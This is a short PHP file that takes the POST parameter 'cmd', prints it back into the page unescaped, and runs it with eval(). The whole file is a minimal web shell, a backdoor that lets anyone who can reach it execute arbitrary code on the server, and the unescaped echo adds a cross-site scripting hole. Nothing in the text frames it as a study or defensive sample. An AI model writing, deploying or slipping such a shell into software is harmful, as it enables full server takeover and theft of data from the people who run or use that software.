<?php
$cmd = $_POST['cmd'];
echo 'The php code <b>'.$cmd.'</b> as been executed.<br>';
eval($cmd);
?>